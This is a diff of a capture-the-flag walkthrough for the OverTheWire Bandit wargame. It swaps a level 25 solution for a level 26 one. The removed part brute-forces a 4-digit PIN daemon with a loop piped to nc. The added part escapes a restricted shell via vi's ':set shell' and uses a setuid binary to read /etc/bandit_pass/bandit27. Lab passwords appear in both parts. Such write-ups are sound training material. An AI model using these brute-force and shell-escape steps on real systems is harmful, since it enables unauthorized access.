@@ -1,50 +1,39 @@
-<h1>Bandit 25</h1>
+<h1>Bandit 26</h1>
 
 <h2 id="level-goal">Level Goal</h2>
-<p>A daemon is listening on port 30002 and will give you the password for
-bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
-There is no way to retrieve the pincode except by going through all of the 10000
-combinations, called brute-forcing.</p>
+<p>Logging in to bandit26 from bandit25 should be fairly easy…
+The shell for user bandit26 is not <strong>/bin/bash</strong>, but something else.
+Find out what it is, how it works and how to break out of it.</p>
+
+<h2 id="commands-you-may-need-to-solve-this-level">Commands you may need to solve this level</h2>
+<p>ssh, cat, more, vi, ls, id, pwd</p>
 
 
 <h1>Solution</h1>
 
 ```
-user@host:~$ ssh bandit24@bandit.labs.overthewire.org -p 2220
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-
-bandit24@bandit:~$ nc localhost 30002
-I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1111
-Wrong! Please enter the correct pincode. Try again.
-^C
+user@host:~$ ssh bandit26@bandit.labs.overthewire.org -p 2220
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
 ```
 
-Let's make a script that automatically tries all combinations.
+So we know this does not work because we get logged out immediately. We need to go back to level 25, resize the terminal again, log into bandit 26 again and try to obtain a shell.
 
 ```
-bandit24@bandit:~$ mkdir /tmp/scripts/
-bandit24@bandit:~$ vim /tmp/myscripts/runme.sh
-  1 #!/bin/bash
-  2 for i in {0000..9999}; do
-  3     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> /tmp/myscripts/combinations.txt
-  4 done
-bandit24@bandit:~$ chmod -x /tmp/myscripts/runme.sh
-bandit24@bandit:~$ touch /tmp/myscripts/combinations.txt
-bandit24@bandit:~$ ls /tmp/myscripts/
-combinations.txt  runme.sh
-bandit24@bandit:~$ bash /tmp/myscripts/runme.sh
-bandit24@bandit:~$ cat /tmp/myscripts/combinations.txt | nc localhost 30002
-Wrong! Please enter the correct pincode. Try again.
-Wrong! Please enter the correct pincode. Try again.
-Wrong! Please enter the correct pincode. Try again.
-...
-Wrong! Please enter the correct pincode. Try again.
-Wrong! Please enter the correct pincode. Try again.
-Correct!
-The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
-
-Exiting.
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
+v
+:set shell ?
+    shell=/usr/bin/showtext
+:set shell=/bin/bash
+:set shell ?
+    shell=/bin/bash
+:shell
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$ file bandit27-do
+bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8e941f24b8c5cd0af67b22b724c57e1ab92a92a1, not stripped
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
 ```
 
-<a href="bandit24.md">Level 24</a>             <a href="bandit26.md">Level 26</a>
+<a href="bandit25.md">Level 25</a>
+<a href="bandit27.md">Level 27</a>
